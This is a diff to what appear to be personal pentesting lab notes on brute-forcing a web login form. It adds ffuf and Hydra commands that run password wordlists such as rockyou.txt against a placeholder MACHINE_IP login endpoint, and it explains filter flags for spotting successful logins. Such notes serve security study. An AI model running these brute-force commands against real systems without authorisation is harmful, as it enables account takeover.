@@ -69,13 +69,19 @@ But you can also exploit the registration form where the "Username already exist
 
 # Brute Force
 
+## FFUF bruteforcing
+
 ```bash
 
-ffuf -w passwords.txt -X POST -d "username=username&password=password" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -[fx] [number or "string for fr"]
+ffuf -w passwords.txt -X POST -d "username=[username]&password=[password]" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -[fx] [number or "string for fr"]
 
 ffuf -w usernames.txt:W1,passwords.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -[fx] [number or "string for fr"]
 
 ```
+
+## Hydra bruteforcing
+
+      hydra -l [username] -P /usr/share/wordlists/rockyou.txt http-post-form://MACHINE_IP/"Account/login.aspx:UserName=^USER^&Password=^PASS^&LoginButton=LogIn:Login failed"
 
 Where -fx could be {fc | fw | fr | fl | fs} which are dual with respect to the matching criteria. For example -fc 200 will return only answers with response codes different from 200 (e.g. 301 permanent redirects for correct login)
 
